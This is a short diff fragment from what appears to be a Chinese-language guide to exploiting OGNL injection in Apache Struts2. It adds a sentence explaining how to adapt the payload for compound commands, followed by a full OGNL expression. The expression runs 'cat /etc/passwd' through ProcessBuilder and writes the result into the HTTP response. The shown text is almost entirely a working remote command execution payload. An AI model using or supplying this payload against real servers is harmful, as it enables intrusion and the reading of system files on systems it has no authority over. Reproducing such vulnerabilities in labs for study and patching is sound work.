@@ -23,3 +23,17 @@
 #f.getWriter().flush(),#f.getWriter().close()
 }
 
+执行任意命令时，如果所执行的命令需要组合，则将上述 payload 改为：
+%{
+#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
+#f.getWriter().println(new java.lang.String(#e)),
+#f.getWriter().flush(),#f.getWriter().close()
+}
+
+
